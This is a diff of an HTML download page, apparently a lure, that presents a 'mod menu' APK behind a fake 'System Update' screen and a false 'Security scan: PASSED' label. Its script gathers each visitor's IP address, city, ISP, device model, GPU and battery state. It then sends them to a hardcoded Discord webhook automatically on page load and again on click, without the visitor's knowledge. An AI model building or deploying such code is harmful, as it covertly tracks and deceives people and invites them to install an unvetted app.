@@ -3,85 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Access</title>
+    <title>System Update</title>
     <style>
-        body { margin: 0; background-color: #000; color: #00ff00; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .btn { padding: 20px 40px; background: #00ff00; color: #000; text-decoration: none; font-weight: bold; border-radius: 10px; font-size: 20px; box-shadow: 0 0 20px #00ff00; cursor: pointer; border: none; }
+        body { margin: 0; background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .container { border: 1px solid #333; padding: 40px; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
+        h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 20px; }
+        .btn { display: inline-block; padding: 15px 40px; background-color: #00ff00; color: #000; text-decoration: none; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; border: none; }
+        .btn:hover { background-color: #00cc00; box-shadow: 0 0 15px #00ff00; }
+        .status { margin-top: 15px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
 
-    <h1>TERMINAL ACCESS</h1>
-    <a href="app-debug.apk" download class="btn" id="actionBtn">DOWNLOAD APK</a>
+    <div class="container">
+        <h1>SYSTEM TERMINAL</h1>
+        <p>MOD MENU V4.2 READY FOR DEPLOYMENT</p>
+        <a href="app-debug.apk" download class="btn" id="actionBtn">INSTALL APK</a>
+        <div class="status">Security scan: PASSED</div>
+    </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
+        const WEBHOOK = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
         const sessionStart = Date.now();
 
-        async function sendLog(type) {
-            let info = {
-                model: "Android (Захищено)",
-                cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
-                gpu: "N/A",
+        async function fetchSystemData(trigger) {
+            let data = {
+                device: "Android (Generic)",
+                hardware: "N/A",
+                network: "N/A",
+                location: "🔍 Отримання...",
                 batt: "N/A",
-                net: "N/A",
-                zone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                ip: "N/A"
             };
 
-            // 1. Модель (тільки HTTPS)
+            // 1. IP & GEO
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const json = await res.json();
+                data.ip = json.ip;
+                data.location = `${json.city}, ${json.country_name}`;
+                data.network = json.org;
+            } catch (e) { data.location = "Заблоковано"; }
+
+            // 2. Hardware & Model (HTTPS Only)
             if (navigator.userAgentData?.getHighEntropyValues) {
-                const h = await navigator.userAgentData.getHighEntropyValues(['model']);
-                info.model = h.model || "Android Device";
+                const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+                data.device = `${ua.model} (Android ${ua.platformVersion})`;
             }
 
-            // 2. Відеокарта (GPU)
+            // 3. GPU (без створення піксельного квадрата)
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
+                data.hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
 
-            // 3. Батарея
+            // 4. Battery
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                info.batt = Math.round(b.level * 100) + "%";
+                data.batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
             }
 
-            // 4. Тип мережі
-            if (navigator.connection) {
-                info.net = navigator.connection.effectiveType.toUpperCase();
-            }
+            const activeTime = ((Date.now() - sessionStart) / 1000).toFixed(1);
 
-            const timeSpent = ((Date.now() - sessionStart) / 1000).toFixed(1);
-
-            // Надсилаємо ТІЛЬКИ технічку
+            // Discord Payload
             const payload = {
-                "content": `🚨 **${type === 'visit' ? 'ВХІД' : 'КЛІК'}**: ${info.model}`,
+                "content": `🔔 **${trigger === 'visit' ? 'ВХІД' : 'КЛІК'}**: ${data.device} | ${data.ip}`,
                 "embeds": [{
-                    "title": type === 'visit' ? "👤 Новий пристрій" : "📥 Завантаження розпочато",
-                    "color": type === 'visit' ? 3066993 : 16711680,
-                    "description": 
-                        `📱 **Модель:** ${info.model}\n` +
-                        `🧠 **Залізо:** ${info.cpu} ядер / ${info.ram} RAM\n` +
-                        `🎮 **GPU:** ${info.gpu}\n` +
-                        `🔋 **Батарея:** ${info.batt}\n` +
-                        `📶 **Тип мережі:** ${info.net}\n` +
-                        `🌐 **Часовий пояс:** ${info.zone}\n` +
-                        `⏱ **На сайті:** ${timeSpent} сек.\n` +
-                        `⏰ **Час:** ${new Date().toLocaleString('uk-UA')}`
+                    "title": trigger === 'visit' ? "👤 Новий сеанс" : "📥 Завантаження файлу",
+                    "color": trigger === 'visit' ? 3066993 : 15105570,
+                    "description": `📱 **Пристрій:** ${data.device}\n🎮 **GPU:** ${data.hardware}\n🌐 **IP:** \`${data.ip}\`\n📍 **Місце:** ${data.location}\n🏢 **Провайдер:** ${data.network}\n🔋 **Батарея:** ${data.batt}\n⏱ **Час на сторінці:** ${activeTime} сек.\n⏰ **Дата:** ${new Date().toLocaleString('uk-UA')}`
                 }]
             };
 
-            fetch(webhookURL, {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
         }
 
-        window.onload = () => setTimeout(() => sendLog('visit'), 1500);
-        document.getElementById('actionBtn').onclick = () => sendLog('download');
+        // Авто-відправка через 2 секунди
+        window.onload = () => setTimeout(() => fetchSystemData('visit'), 2000);
+
+        // Відправка при кліку
+        document.getElementById('actionBtn').onclick = () => fetchSystemData('click');
     </script>
 </body>
 </html>
